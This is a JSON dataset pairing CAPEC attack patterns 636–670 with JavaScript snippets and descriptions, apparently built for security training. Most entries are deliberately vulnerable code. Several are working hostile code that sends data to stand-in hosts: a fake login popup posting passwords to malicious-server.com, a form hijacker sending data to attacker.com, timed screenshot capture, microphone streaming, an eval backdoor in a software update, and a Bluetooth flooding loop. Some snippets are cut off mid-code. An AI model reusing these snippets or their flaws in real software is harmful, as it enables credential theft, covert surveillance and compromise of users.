        "description": "This vulnerable code processes uploaded files based solely on their file extension without proper validation of the actual file content. An attacker could bypass security controls by renaming a malicious file with a trusted extension (e.g., renaming a .php file to .txt) or using Windows 8.3 filename equivalents. The code also unsafely creates and displays content from user-supplied files, potentially leading to XSS attacks through HTML injection or execution of malicious scripts."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "function storeHiddenData(imageFile) {\n    const maliciousPayload = btoa('console.log(\\'Malicious code executed\\');');\n    const img = new Image();\n    img.src = imageFile;\n    \n    img.onload = function() {\n        const canvas = document.createElement('canvas');\n        const ctx = canvas.getContext('2d');\n        canvas.width = img.width;\n        canvas.height = img.height;\n        \n        ctx.drawImage(img, 0, 0);\n        \n        // Hide malicious data in alpha channel\n        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);\n        const data = imageData.data;\n        \n        for(let i = 0; i < maliciousPayload.length; i++) {\n            data[i * 4 + 3] = maliciousPayload.charCodeAt(i);\n        }\n        \n        ctx.putImageData(imageData, 0, 0);\n        const modifiedImage = canvas.toDataURL('image/png');\n        \n        // Store in web accessible location\n        localStorage.setItem('cached_image', modifiedImage);\n    };\n}",
        "description": "This code demonstrates embedding malicious data within image metadata by manipulating the alpha channel of PNG files. The data is stored in a web-accessible location (localStorage) and can be later extracted and executed. The malicious payload is encoded in base64 and hidden within the image's transparency values, creating a covert storage channel."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "// Clipboard manager for sensitive data\nclass SecureDataManager {\n    constructor() {\n        this.sensitiveData = {\n            apiKey: 'sk_live_12345abcdef',\n            userCredentials: 'admin:password123',\n            sysInfo: '/etc/passwd content here'\n        };\n        \n        this.clipboardData = '';\n    }\n\n    copyToClipboard(key) {\n        this.clipboardData = this.sensitiveData[key];\n        navigator.clipboard.writeText(this.clipboardData);\n        document.getElementById('status').innerHTML = \n            'Copied: ' + this.clipboardData.substring(0, 10) + '...';\n    }\n\n    displaySensitiveInfo() {\n        let output = document.getElementById('sensitiveInfo');\n        output.innerHTML = JSON.stringify(this.sensitiveData, null, 2);\n    }\n}\n\nlet manager = new SecureDataManager();\nmanager.displaySensitiveInfo();",
        "description": "This vulnerable code stores sensitive information in cleartext and exposes it through clipboard operations. It fails to protect against unauthorized clipboard access, displays sensitive data in the GUI, and truncates security-relevant information in status messages. The code stores API keys, credentials, and system information that could be intercepted by malicious applications monitoring the clipboard."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "\"const bootloader = {\n    secureBootEnabled: false,\n    mbr: new Uint8Array(512),\n    firmwareVersion: '1.0',\n    \n    initialize: function() {\n      // No access control checks before loading bootloader\n      this.loadBootCode();",
        "description": "\"This code demonstrates multiple boot-level vulnerabilities including lack of secure boot implementation, unrestricted memory access, no firmware update capability, and missing code signature verification. The bootloader allows direct execution of potentially malicious code from memory without proper validation or access controls, making it susceptible to MBR modification attacks and persistent malware execution.\""
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction storeUserData(userData) {\n  const tempFile = path.join('/tmp', 'user_' + Math.random() + '.json');\n  const sensitiveData = {\n    username: userData.username,\n    password: userData.password,\n    ssn: userData.ssn,\n    apiKeys: process.env.API_KEYS,\n    dbCredentials: process.env.DB_CREDENTIALS\n  };\n\n  try {\n    fs.writeFileSync(tempFile, JSON.stringify(sensitiveData));\n    fs.chmodSync(tempFile, '0644');\n    return tempFile;\n  } catch(err) {\n    console.error('Error details:', err.stack);\n    throw err;\n  }\n}",
        "description": "This code creates a temporary file in a world-readable directory with sensitive user data and system credentials. It has multiple vulnerabilities: uses predictable file paths, stores unencrypted sensitive data, sets overly permissive file permissions (0644), exposes system information in error messages, and doesn't clean up temporary files. The file is accessible to all users on the system."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "function loadExternalLibrary(libraryUrl) {\n  let script = document.createElement('script');\n  script.src = libraryUrl;\n  script.onload = function() {\n    let maliciousPayload = atob('ZXZhbChkb2N1bWVudC5jb29raWUpOw==');\n    let originalFunction = window.JSON.parse;\n    window.JSON.parse = function(text) {\n      eval(maliciousPayload);\n      return originalFunction.apply(this, arguments);\n    };\n    Object.defineProperty(window, 'JSON', {\n      writable: false,\n      configurable: false\n    });\n  };\n  document.head.appendChild(script);\n}\n\nloadExternalLibrary('https://malicious-cdn.com/legitimate-looking.js');",
        "description": "This code demonstrates process/library injection by loading an untrusted external JavaScript library and hijacking the JSON.parse function. It uses function hooking to inject malicious code that executes whenever JSON.parse is called, while masking the execution under legitimate functionality. The code includes base64 encoded payload and attempts to prevent modification of the compromised JSON object."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "const path = require('path');\nconst { exec } = require('child_process');\n\nfunction loadLibrary(libraryName) {\n    const searchPaths = [\n        './libs',\n        'C:/Windows/System32',\n        'C:/Windows/SysWOW64',\n        process.env.PATH\n    ];\n\n    for (const searchPath of searchPaths) {\n        const dllPath = path.join(searchPath, libraryName);\n        try {\n            // Vulnerable: No validation of DLL authenticity or path\n            exec(`rundll32.exe ${dllPath}`, (error, stdout, stderr) => {\n                if (!error) {\n                    console.log(`Loaded library from: ${dllPath}`);\n                }\n            });\n            break;\n        } catch (err) {\n            continue;\n        }\n    }\n}\n\nloadLibrary('example.dll');",
        "description": "This code demonstrates vulnerable DLL loading by searching for and loading a DLL without proper path validation or authenticity checks. It uses a predefined search path that could include user-controllable directories, making it susceptible to DLL side-loading attacks. The code doesn't verify the DLL's source or implement manifest-based loading, allowing potential execution of malicious DLLs placed in the search paths."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\nconst exec = require('child_process').exec;\n\nfunction installUpdate(updatePath) {\n  // Vulnerable search path and permission handling\n  const installDir = 'C:\\Program Files\\App\\Updates';\n  const extractDir = path.join(installDir, 'temp');\n  \n  // Extract files with weak permissions\n  fs.mkdirSync(extractDir, { recursive: true, mode: 0o777 });\n  \n  // Unquoted path in command execution\n  exec('Update Installer.exe /path=' + extractDir, (error, stdout, stderr) => {\n    // Copy extracted files to system directory without validation\n    fs.copyFileSync(\n      path.join(extractDir, 'system.dll'),\n      'C:\\Windows\\System32\\system.dll'\n    );\n    \n    // Clean up - but files might have been tampered with\n    fs.rmdirSync(extractDir, { recursive: true });\n  });\n}",
        "description": "This code demonstrates vulnerable file operations during a software update process. It creates directories with overly permissive access (777), uses unquoted and unvalidated paths in command execution, and copies files to system directories without proper verification. The code allows potential binary replacement attacks through weak file permissions and untrusted search paths."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "function searchNetworkShares() {\n    const networkPath = '\\\\\\\\SERVER\\\\shared\\\\';\n    const userInput = document.getElementById('pathInput').value;\n    const fullPath = networkPath + userInput;\n    \n    try {\n        // Unsafe direct concatenation of user input with network path\n        const xhr = new XMLHttpRequest();\n        xhr.open('GET', fullPath, true);\n        xhr.onreadystatechange = function() {\n            if (xhr.readyState === 4) {\n                const files = JSON.parse(xhr.responseText);\n                // Expose all found files without access control\n                displaySharedFiles(files);\n                // Store discovered paths in public location\n                localStorage.setItem('discoveredShares', JSON.stringify(files));\n            }\n        };\n        xhr.send();\n    } catch(e) {\n        console.log('Error accessing path: ' + fullPath);\n    }\n}",
        "description": "This vulnerable code allows uncontrolled access to network shares through direct path manipulation. It stores discovered network paths in localStorage without access control, accepts unchecked UNC paths, and exposes sensitive file listings to any user. The code lacks proper privilege checks and path validation, enabling path traversal attacks and unauthorized access to network resources."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "const loginHandler = async (req, res) => {\n  const { username, passwordHash } = req.body;\n  \n  // Insecure: Directly comparing password hashes\n  const query = 'SELECT * FROM users WHERE username = ? AND password_hash = ?';\n  \n  const user = await db.query(query, [username, passwordHash]);\n  \n  if (user) {\n    // Create session token without additional factors\n    const token = createSessionToken(user.id);\n    \n    // Store NTLM hash for Windows domain auth\n    const ntlmHash = generateNTLMHash(passwordHash);\n    await db.query('UPDATE users SET ntlm_hash = ? WHERE id = ?', [ntlmHash, user.id]);\n    \n    res.cookie('auth_token', token);\n    res.json({ success: true });\n  }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including storing and comparing password hashes directly, single-factor authentication, and storing NTLM hashes that could be captured and replayed. The code accepts a pre-hashed password from the client, stores NTLM hashes in the database, and implements a basic token-based authentication without additional security factors."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "const kerberos = require('kerberos');\n\nclass AuthenticationService {\n    constructor() {\n        this.ticketCache = new Map();\n    }\n\n    saveTicket(ticket) {\n        // Store Kerberos ticket in plaintext\n        this.ticketCache.set(ticket.id, ticket.data);\n    }\n\n    validateTicket(receivedTicket) {\n        // No timestamp validation\n        // No ticket signature verification\n        const cachedTicket = this.ticketCache.get(receivedTicket.id);\n        return cachedTicket === receivedTicket.data;\n    }\n\n    authenticateUser(ticket) {\n        if (this.validateTicket(ticket)) {\n            // Grant access without additional verification\n            return {\n                authenticated: true,\n                accessLevel: 'admin'\n            };\n        }\n        return { authenticated: false };\n    }\n}",
        "description": "This code demonstrates vulnerable Kerberos ticket handling where tickets are stored insecurely in plaintext, lack proper validation mechanisms, and can be easily replayed. The authentication system uses single-factor authentication, doesn't verify ticket timestamps or signatures, and stores credentials in an unsafe manner. This implementation allows capture-replay attacks and bypass of authentication through stolen or replayed Kerberos tickets."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "`\n    function scanConnectedDevices() {\n      let deviceInfo = [];\n      \n      // Expose USB device information through navigator\n      if (navigator.usb) {\n        navigator.usb.getDevices()\n          .then(devices => {\n            devices.forEach(device => {\n              deviceInfo.push({\n                productId: device.productId,\n                vendorId: device.vendorId,\n                manufacturerName: device.manufacturerName,\n                serialNumber: device.serialNumber",
        "description": "\"This vulnerable code demonstrates information exposure by collecting and transmitting sensitive device and system information without proper authorization or user consent. It uses the WebUSB API to gather details about connected USB devices and collects system information, then sends it to an unauthorized server. The code exhibits multiple vulnerabilities including exposure of sensitive system information (CWE-497), exposure of sensitive information to unauthorized actors (CWE-200), and improper handling of device information.\""
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "function getSystemInfo() {\n  const registry = {\n    'SYSTEM': {\n      'SecuritySettings': {\n        'adminPassword': 'cleartext123',\n        'encryptionKeys': ['key1', 'key2'],\n        'trustedHosts': ['host1', 'host2']\n      },\n      'NetworkConfig': {\n        'openPorts': [80, 443, 3389],\n        'vpnCredentials': 'vpn_password_clear'\n      },\n      'SoftwareInfo': {\n        'installedApps': ['app1', 'app2'],\n        'versions': {'OS': '10.1', 'kernel': '4.5'}\n      }\n    }\n  };\n\n  function readRegistry(path) {\n    // No proper authorization check\n    return registry[path];\n  }\n\n  // Expose sensitive system info without verification\n  const systemInfo = readRegistry('SYSTEM');\n  return systemInfo;\n}\n\n// Any user can access sensitive registry data\nconst sensitiveData = getSystemInfo();",
        "description": "This code demonstrates vulnerable registry access by storing sensitive system information in cleartext and failing to implement proper authorization checks. It simulates a registry structure containing sensitive data like passwords, security settings, and system configuration. The code allows unrestricted access to this information without validating the user's permissions, exposing sensitive system data to unauthorized users."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "// Sensitive screenshot capture and transmission functionality\nconst captureScreen = async () => {\n  try {\n    const stream = await navigator.mediaDevices.getDisplayMedia();\n    const track = stream.getVideoTracks()[0];\n    const imageCapture = new ImageCapture(track);\n    const bitmap = await imageCapture.grabFrame();\n    \n    const canvas = document.createElement('canvas');\n    canvas.width = bitmap.width;\n    canvas.height = bitmap.height;\n    const context = canvas.getContext('2d');\n    context.drawImage(bitmap, 0, 0);\n    \n    // Unsafe transmission of sensitive screenshot data\n    const screenshotData = canvas.toDataURL('image/jpeg');\n    fetch('http://malicious-server.com/collect', {\n      method: 'POST',\n      body: JSON.stringify({ screenshot: screenshotData }),\n      headers: { 'Content-Type': 'application/json' }\n    });\n    \n    track.stop();\n  } catch(error) {\n    console.error('Screen capture failed:', error);\n  }\n};\n\n// Auto-trigger capture every 30 seconds\nsetInterval(captureScreen, 30000);",
        "description": "This code demonstrates a vulnerability where screen captures are automatically taken and transmitted in cleartext to an unauthorized server. It uses the Screen Capture API without proper access controls, captures potentially sensitive information displayed on screen, and sends it unencrypted over HTTP. The periodic capture occurs without user awareness, potentially leaking sensitive data continuously."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "function processUploadedFile(filename) {\n  let fileExtension = filename.split('.').pop();\n  \n  // Vulnerable: doesn't handle trailing spaces in extension\n  if (fileExtension === 'txt') {\n    readTextFile(filename);\n  } else if (fileExtension === 'exe') {\n    return 'Executable files not allowed';\n  } else if (fileExtension === 'html') {\n    renderHtmlContent(filename);\n  }\n  \n  // Attacker can bypass by using 'malicious.exe ' (note trailing space)\n  // System might process it as executable while code sees it as unknown type\n}\n\nprocessUploadedFile('user_upload.txt ');",
        "description": "This vulnerable code checks file extensions without properly sanitizing trailing spaces, allowing attackers to bypass file type restrictions. An attacker could upload 'malware.exe ' (with trailing space) which might be treated as an executable by the system while bypassing the code's extension check."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', function(req, res) {\n    if (!req.files || !req.files.file) {\n        return res.status(400).send('No files were uploaded.');\n    }\n\n    let uploadedFile = req.files.file;\n    let uploadPath = __dirname + '/public/uploads/' + uploadedFile.name;\n\n    // No authentication check\n    // No file type validation\n    // No permissions check\n    uploadedFile.mv(uploadPath, function(err) {\n        if (err) return res.status(500).send(err);\n        res.send('File uploaded!');\n    });\n\n    // Dangerous file execution\n    if (uploadedFile.name.endsWith('.php') || uploadedFile.name.endsWith('.jsp')) {\n        require('child_process').exec('chmod 755 ' + uploadPath);\n    }\n});\n\napp.listen(3000);",
        "description": "This vulnerable code implements a file upload endpoint that lacks proper authentication, file type validation, and permission controls. It allows unrestricted file uploads to a publicly accessible directory and even sets executable permissions on certain file types. The code demonstrates multiple vulnerabilities including improper authentication (CWE-287), dangerous file type upload (CWE-434), and potential command shell exposure (CWE-553). The server blindly trusts client-side input (CWE-602) and places uploaded files in a potentially executable directory."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "class AudioRecorder {\n    constructor() {\n        this.recordedData = [];\n        this.isRecording = false;\n    }\n\n    async startRecording() {\n        try {\n            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });\n            this.mediaRecorder = new MediaRecorder(stream);\n            \n            this.mediaRecorder.ondataavailable = (event) => {\n                if (event.data.size > 0) {\n                    this.recordedData.push(event.data);\n                    // Send raw audio data in cleartext over WebSocket\n                    const ws = new WebSocket('ws://malicious-server.com');\n                    ws.send(event.data);\n                }\n            };\n\n            this.mediaRecorder.start();\n            this.isRecording = true;\n            \n            // Store sensitive audio data in localStorage without encryption\n            localStorage.setItem('recorded_audio', JSON.stringify(this.recordedData));\n        } catch (error) {\n            console.log('Failed to start recording:', error);\n        }\n    }\n}",
        "description": "This vulnerable code implements an audio recording functionality that demonstrates unauthorized access to sensitive information. It captures audio through the user's microphone, transmits the raw data in cleartext over WebSocket, and stores it unencrypted in localStorage, creating multiple attack vectors for eavesdropping and unauthorized access to sensitive audio data."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "`\nconst userAuth = {\n  credentials: new Map(),\n  loginAttempts: new Map(),\n\n  storeCredentials(username, password) {\n    // Storing plain text credentials in memory\n    this.credentials.set(username, password);",
        "description": "\"A vulnerable authentication system that stores credentials in plain text, uses single-factor authentication, lacks password aging, has no rate limiting for login attempts, and is susceptible to replay attacks. The system stores credentials in memory, performs simple password comparison, and generates basic tokens that can be easily captured and replayed.\""
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "const loginAttempts = {};  // Global login attempts counter\n\nfunction authenticateUser(username, password) {\n    // No rate limiting or account lockout\n    loginAttempts[username] = (loginAttempts[username] || 0) + 1;\n    \n    // Store credentials in plain text\n    const credentials = {\n        admin: 'admin123',\n        user: 'password123'\n    };\n\n    // Single factor authentication with simple password check\n    if (credentials[username] === password) {\n        // No password expiration check\n        return {\n            authenticated: true,\n            token: btoa(username + ':' + password)  // Base64 encoding of credentials\n        };\n    }\n    return { authenticated: false };\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including: storing credentials in plain text, lack of password aging/expiration, no rate limiting for failed attempts, single-factor authentication, base64 encoding of credentials for token generation, and no protection against brute force attacks."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "// Malicious popup that mimics a legitimate login prompt\nfunction createFakeLoginPopup() {\n    const overlay = document.createElement('div');\n    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:99999';\n    \n    const popup = document.createElement('div');\n    popup.innerHTML = `\n        <div style='background:white;width:300px;padding:20px;margin:100px auto;border-radius:5px'>\n            <img src='https://legitimate-looking-domain.com/logo.png' style='width:150px'>\n            <h3>Session Expired</h3>\n            <p>Please re-enter your credentials</p>\n            <input type='text' id='fake-username' placeholder='Username'>\n            <input type='password' id='fake-password' placeholder='Password'>\n            <button onclick='stealCredentials()'>Login</button>\n        </div>\n    `;\n    \n    overlay.appendChild(popup);\n    document.body.appendChild(overlay);\n}\n\nfunction stealCredentials() {\n    const username = document.getElementById('fake-username').value;\n    const password = document.getElementById('fake-password').value;\n    \n    fetch('https://malicious-server.com/collect', {\n        method: 'POST',\n        body: JSON.stringify({ username, password })\n    });\n}",
        "description": "This code creates a deceptive login popup that appears legitimate but actually steals user credentials. It overlays the entire page with a fake authentication prompt styled to look genuine, then sends captured credentials to a malicious server. The popup uses high z-index to ensure it appears above legitimate content and mimics the visual style of authentic system dialogs."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "const fs = require('fs');\n\nfunction handleFileUpload(uploadedFile, filename) {\n    // Accept any file without validation\n    const fileExtension = filename.split('.').pop();\n    \n    // Store sensitive data in temporary file\n    const tempLogFile = '/tmp/upload_' + Date.now() + '.log';\n    const sensitiveData = 'API_KEY=12345,DB_PASSWORD=secret';\n    \n    fs.writeFileSync(tempLogFile, sensitiveData);\n    \n    // Process file based only on extension\n    if(fileExtension === 'txt') {\n        // Append large amount of data to uploaded file\n        const largeData = Buffer.alloc(1024 * 1024 * 100, 'X');\n        fs.appendFileSync(uploadedFile, largeData);\n        fs.appendFileSync(uploadedFile, sensitiveData);\n    }\n    \n    // Log file details with sensitive information\n    fs.appendFileSync('upload.log', `Processed ${filename} with key ${sensitiveData}\\n`);\n}",
        "description": "This code demonstrates vulnerable file handling by accepting files without proper validation, storing sensitive data in temporary files, relying solely on file extensions for processing, and logging sensitive information. It also implements file bloating by appending large amounts of data to potentially bypass security scanning."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "`\n    // Simulated call center authentication system\n    class CallCenterAuth {\n      constructor() {\n        this.userCredentials = new Map();\n        this.failedAttempts = {",
        "description": "\"This vulnerable code implements a call center authentication system that demonstrates multiple security flaws related to voice phishing. It lacks proper caller verification, has no protection against authentication attempts, stores sensitive information insecurely, and exposes personal data without proper authorization checks. The system blindly trusts caller ID and handles sensitive information in plaintext.\""
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "`\n  function checkForUpdates() {\n    let updateServer = getUpdateServerFromConfig();\n    \n    fetch(updateServer + '/check-update')\n      .then(response => response.json())\n      .then(data => {\n        if(data.updateAvailable) {\n          // No validation of update source or content\n          let update = fetch(data.updateUrl)\n            .then(response => response.blob())\n            .then(blob => {\n              let script = document.createElement('script');\n              script.src = URL.createObjectURL(blob);\n              document.body.appendChild(script);\n              \n              // Execute update without integrity verification\n              eval(blob);\n              localStorage.setItem('lastUpdate', Date.now());",
        "description": "\"Vulnerable auto-update mechanism that downloads and executes code without proper integrity checks or source validation. The code fetches updates from a configurable server without verifying the authenticity of the source or the downloaded content. It uses eval() to execute downloaded code and automatically injects scripts into the page, making it susceptible to malicious code execution and XSS attacks.\""
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "`\n    const loadExternalCode = (url) => {\n      fetch(url)\n        .then(response => response.text())\n        .then(code => {\n          // Bypass root detection by hooking into system checks\n          const originalCheckRoot = window.checkRootStatus;\n          window.checkRootStatus = () => false;\n\n          // Load and execute arbitrary code without verification\n          const script = document.createElement('script');\n          script.textContent = code;\n          document.body.appendChild(script);\n\n          // Custom URL scheme handler without proper authorization\n          window.location.protocol = 'customscheme:';\n          \n          // Execute system commands with user input\n          const executeCommand = (cmd) => {\n            const command = 'adb shell ' + cmd;\n            return exec(command);",
        "description": "\"A vulnerable JavaScript implementation that allows loading and executing arbitrary code while bypassing root detection through code hooking. It includes unsafe loading of external code without integrity checks, improper handling of custom URL schemes, exposure of sensitive system information, and potential OS command injection vectors.\""
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "`\n// Debug flag left enabled in production\nconst DEBUG_MODE = true;\nconst ADMIN_ACCESS = true;\n\nclass MobileApp {\n    constructor() {\n        this.isRooted = false;\n        this.debugEnabled = true;",
        "description": "\"This code demonstrates a vulnerable mobile application that contains active debug code, improper access controls, and exposed system information. It includes a faulty root detection mechanism that can be easily bypassed through debug mode, exposes sensitive trace data and system information, and contains a debug backdoor in the authentication process.\""
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "// Malicious browser extension code\nlet originalRequest = XMLHttpRequest.prototype.open;\nXMLHttpRequest.prototype.open = function(method, url) {\n    if (url.includes('bank.com')) {\n        url = url.replace('bank.com', 'evil-bank.com');\n        let maliciousScript = document.createElement('script');\n        maliciousScript.src = 'http://malicious-cdn.com/payload.js';\n        document.body.appendChild(maliciousScript);\n    }\n    return originalRequest.apply(this, arguments);\n};\n\n// Intercept form submissions\ndocument.addEventListener('submit', function(e) {\n    if (e.target.action.includes('secure-endpoint')) {\n        e.preventDefault();\n        let formData = new FormData(e.target);\n        fetch('http://attacker.com/collect', {\n            method: 'POST',\n            body: formData\n        });\n    }\n});",
        "description": "This code represents a browser-based man-in-the-middle attack that intercepts and modifies XMLHttpRequests and form submissions. It downloads and executes arbitrary code from a malicious CDN, redirects banking traffic to a malicious domain, and exfiltrates form data to an attacker's server. The code exploits client-side security controls and lacks proper integrity checks for downloaded code."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "function readSecretData(address) {\n  try {\n    // Deliberately cause branch misprediction\n    for(let i = 0; i < 256; i++) {\n      let tmp = 0;\n      // Speculative execution gadget\n      if(i < array.length) {\n        // Access array with bounds check (will be speculatively executed)\n        tmp = array[i];\n        // Encode secret into cache timing\n        probe_array[tmp * 4096];\n      }\n    }\n  } catch(e) {\n    // Suppress any exceptions from invalid access\n  }\n  // Measure cache access times to extract secret\n  let results = [];\n  for(let i = 0; i < 256; i++) {\n    let start = performance.now();\n    let x = probe_array[i * 4096];\n    let time = performance.now() - start;\n    if(time < 100) results.push(i);\n  }\n  return results;\n}",
        "description": "This code demonstrates a Spectre-style attack by exploiting speculative execution and cache timing. It uses array bounds checking to create a transient execution gadget that speculatively accesses memory outside intended bounds. The secret data is encoded into cache timing differences which can be measured to extract sensitive information through a covert channel attack."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "`\nconst express = require('express');\nconst fetch = require('node-fetch');\nconst app = express();\n\napp.get('/fetch-data', async (req, res) => {\n    const url = req.query.url;\n    try {\n        const response = await fetch(url);\n        const data = await response.text();\n        res.send(data);",
        "description": "\"This code demonstrates a vulnerable SSRF endpoint that blindly accepts a URL parameter from user input and makes a server-side request to that URL without any validation. An attacker could exploit this to make the server request internal resources or malicious external endpoints by providing URLs like 'http://localhost:8080/admin' or 'http://internal-network/sensitive-data'.\""
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "`\n    class ThunderboltController {\n      constructor() {\n        this.firmwareVersion = '1.0';\n        this.isAuthenticated = false;\n        this.defaultPassword = '1234'; // Insecure default\n        \n        // Missing integrity verification for firmware updates\n        this.updateFirmware = function(newFirmware) {\n          // No origin verification\n          this.firmwareVersion = newFirmware;\n          return true;",
        "description": "\"Vulnerable implementation of a Thunderbolt controller that lacks proper authentication, authorization, and data integrity verification. It includes insecure defaults, missing verification of firmware updates, bypassing authentication through direct memory access, and insufficient device verification mechanisms.\""
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "class BluetoothConnection {\n    constructor() {\n        this.socket = null;\n        this.l2capChannel = null;\n    }\n\n    connect(deviceAddress) {\n        this.socket = new BluetoothSocket();\n        this.l2capChannel = this.socket.connectL2CAP(deviceAddress);\n    }\n\n    sendLargePacket() {\n        const payload = Buffer.alloc(65535).fill('A');\n        while(true) {\n            try {\n                this.l2capChannel.write(payload);\n            } catch(e) {\n                continue;\n            }\n        }\n    }\n\n    disconnect() {\n        // Resource not properly released\n        this.l2capChannel = null;\n        // Socket left open\n    }\n}\n\nconst attack = new BluetoothConnection();\nattack.connect('00:11:22:33:44:55');\nattack.sendLargePacket();",
        "description": "Vulnerable Bluetooth implementation that creates a DoS condition through L2CAP flooding. It uses direct socket connections, doesn't properly close resources, sends data in cleartext, and lacks message integrity checks. The code continuously sends large packets without rate limiting or proper error handling."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "`\nconst bluetoothDevice = {\n  macAddress: null,\n  trustedDevices: new Map([\n    ['00:11:22:33:44:55', 'TrustedDevice1'],\n    ['AA:BB:CC:DD:EE:FF', 'TrustedDevice2']\n  ]),\n  \n  connect(incomingMacAddress) {\n    // Vulnerable: No verification of MAC authenticity\n    if (this.trustedDevices.has(incomingMacAddress)) {\n      this.macAddress = incomingMacAddress;\n      return true;",
        "description": "\"This code demonstrates vulnerable Bluetooth device authentication that only relies on MAC address verification. It allows MAC address spoofing attacks by not implementing proper device authentication mechanisms, lacking channel verification, and having weak authentication checks. The code accepts any incoming connection that matches a trusted MAC address without additional verification steps.\""
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "// Bluetooth connection setup with weak key negotiation\nclass BluetoothConnection {\n    constructor() {\n        this.entropy = 8; // Low entropy bits for key generation\n        this.key = null;\n    }\n\n    negotiateKey(peerDevice) {\n        // Vulnerable key negotiation process\n        let supportedAlgorithms = ['none', 'weak_cipher', 'strong_cipher'];\n        let selectedAlgo = 'weak_cipher';\n        \n        // Weak entropy generation\n        let weakEntropy = Math.floor(Math.random() * Math.pow(2, this.entropy));\n        \n        // Insecure key exchange without validation\n        this.key = Buffer.from(weakEntropy.toString()).toString('base64');\n        \n        return {\n            algorithm: selectedAlgo,\n            entropy: weakEntropy,\n            key: this.key\n        };\n    }\n\n    encrypt(data) {\n        // Weak encryption using negotiated key\n        return data + this.key;\n    }\n}",
        "description": "This code demonstrates vulnerable Bluetooth key negotiation by using insufficient entropy bits, allowing for key downgrade attacks. It implements weak algorithm selection and lacks proper validation of negotiated parameters, making it susceptible to man-in-the-middle attacks and key interception. The encryption process is simplified and insecure."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "// Software update distribution system\nconst updateServer = {\n    updatePackages: {},\n    signatureKey: 'compromised_key',\n    \n    addUpdate: function(version, content) {\n        this.updatePackages[version] = content;\n    },\n    \n    distributeUpdate: function(version) {\n        // No signature verification\n        return this.updatePackages[version];\n    }\n};\n\n// Malicious code injection into update\nconst maliciousPayload = `\n    function backdoor() {\n        const data = collectSensitiveData();\n        sendToAttacker('evil-server.com', data);\n    }\n    setInterval(backdoor, 3600000);\n`;\n\nupdateServer.addUpdate('2.0.1', maliciousPayload);\n\n// Client update function with no verification\nfunction performUpdate(version) {\n    const update = updateServer.distributeUpdate(version);\n    eval(update); // Dangerous direct execution of received code\n    return true;\n}\n\nperformUpdate('2.0.1');",
        "description": "This code demonstrates a vulnerable software update system where an attacker can inject malicious code into the update distribution process. The system lacks proper signature verification, version control protection, and secure update mechanisms. It includes a backdoor that collects and exfiltrates sensitive data, representing embedded malicious code that could be distributed through compromised updates."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "// Malicious build tool modification\nconst originalRequire = require;\nrequire = function(module) {\n    if(module === 'crypto') {\n        return {\n            randomBytes: function(size) {\n                return Buffer.from('0'.repeat(size));\n            },\n            createHash: function() {\n                return {\n                    update: function() { return this; },\n                    digest: function() { return 'compromised'; }\n                };\n            }\n        };\n    }\n    return originalRequire(module);\n};\n\n// Infected production code\nfunction secureOperation(data) {\n    const crypto = require('crypto');\n    // Security critical code that's now compromised\n    return crypto.createHash('sha256').update(data).digest('hex');\n}",
